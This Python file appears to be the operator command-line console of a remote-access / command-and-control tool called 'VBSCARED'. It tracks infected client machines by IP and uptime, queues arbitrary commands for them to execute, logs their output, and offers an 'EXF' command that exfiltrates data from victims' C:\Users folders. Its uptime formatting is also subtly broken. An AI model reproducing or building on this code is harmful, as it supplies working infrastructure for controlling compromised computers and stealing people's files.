from enum import Enum
from pathlib import Path
from typing import List
from client import Client
from subscriber import ServerSubscriber
import sys
import datetime

class Context(Enum):
    MAIN_MENU = 1
    CLIENT = 2


class Cli(ServerSubscriber):

    def __init__(self, server):
        self.server = server
        server.register_subscriber(self)
        self.context = Context.MAIN_MENU
        self.update_context_text("VBSCARED")
        self.current_client = ""

    def on_client_register(self, client: Client):
        print()
        print(f"[+] New connection from {client.ip}")
        self.print_new_line()
        print("", end="",flush=True)

    def on_client_cmd_output(self, client: Client, output: str):
        print(flush=True)
        print(f"[~] Data from {client.ip} ({client.friendly_name})")
        Path("client_log").mkdir(parents=True, exist_ok=True)
        with open(f"client_log/{client.friendly_name}.txt",'a') as f:
            f.write(f"{output}\n")
        print(output)
        self.print_new_line()
        print("", end="",flush=True)
    
    def on_client_exfiltration(self, client: Client):
        print(flush=True)
        print(f"[~] Exfiltrating data from {client.ip} ({client.friendly_name})")
        self.print_new_line()
    
    def tick(self):
        try:
            self.print_new_line()
            user_input: str = input()
            if user_input.upper() == 'HELP':
                self.print_help()
            elif self.context == Context.MAIN_MENU:
                if user_input.upper() == 'CLIENTS':
                    self.print_clients()
                elif user_input.upper().startswith('C '):
                    self.switch_context_to_client(user_input)
                else:
                    self.print_unrecognized_command()
            elif self.context == Context.CLIENT:
                if user_input.upper() == 'MAIN':
                    self.switch_context_to_main()
                elif user_input.upper().startswith('CMD '):
                    self.set_client_cmd(user_input[4:])
                elif user_input.upper() == "EXFILTRATE" or user_input.upper() == "EXF":
                    self.set_client_cmd("EXFILTRATE")
                else:
                    self.print_unrecognized_command()
        except KeyboardInterrupt:
            sys.exit()
        except EOFError:
            sys.exit()
    
    def print_new_line(self):
        print(f"{self.context_text}>", end=" ")
    
    def poll(self):
        while True:
            self.tick()

    def switch_context_to_client(self, user_input: str):
        c = user_input[2:]
        client = self.server.get_client(c)
        if client is None:
            print("Client does not exist, please try again")
            return
        self.context = Context.CLIENT
        self.current_client = client.friendly_name
        self.update_context_text(f"{client.ip} ({client.friendly_name})")
    
    def switch_context_to_main(self):
        self.context = Context.MAIN_MENU
        self.update_context_text("VBSCARED")
        self.current_client = ""
    
    def update_context_text(self, new_text: str):
        self.context_text = '\033[1m' + new_text + '\033[0m'
    
    def set_client_cmd(self, cmd: str):
        self.server.set_client_command(self.current_client, cmd)
        print("The command was successfully set and will be executed on the next client poll")
    
    def print_help(self):
        if self.context == Context.MAIN_MENU:
            print("MAIN COMMANDS:")
            print("------------------------------------------------------")
            print("| clients          | show connected clients          |")
            print("|----------------------------------------------------|")
            print("| c <id/name>      | switch to client with id/name   |")
            print("------------------------------------------------------")
            
            print()
        elif self.context == Context.CLIENT:
            print("CLIENT COMMANDS:")
            print("------------------------------------------------------")
            print("| main             | go back to the main menu        |")
            print("|----------------------------------------------------|")
            print("| cmd <command>    | set a command to execute        |")
            print("------------------------------------------------------")
            print("| EXF              | exfiltrate data from C:\\Users   |")
            print("------------------------------------------------------")
            print()
    
    def print_unrecognized_command(self):
        print("Unrecognized command, enter 'HELP' to show the help menu")
    
    def print_clients(self):
        print("CLIENTS:")
        print()
        clients: List[Client] = self.server.clients
        for c in clients:
            print(c.friendly_name)
            print("------------------")
            print(f"IP: {c.ip}")
            print(f"UPTIME: {self.get_time_since_timestamp(c.first_ping_timestamp)}")
            print()

    def get_time_since_timestamp(self, timestamp: float):
        dt = datetime.datetime.fromtimestamp(timestamp)
        now = datetime.datetime.now()
        elapsed = now-dt
        hours = int(elapsed.seconds/60/60)
        minutes = int(elapsed.seconds/60)
        hours_text = ""
        minutes_text = ""
        if hours < 10:
            hours_text = f"0{hours} hour(s)"
        if minutes < 10:
            minutes_text = f"0{minutes} minute(s)"
        return f"{hours_text} {minutes_text}"

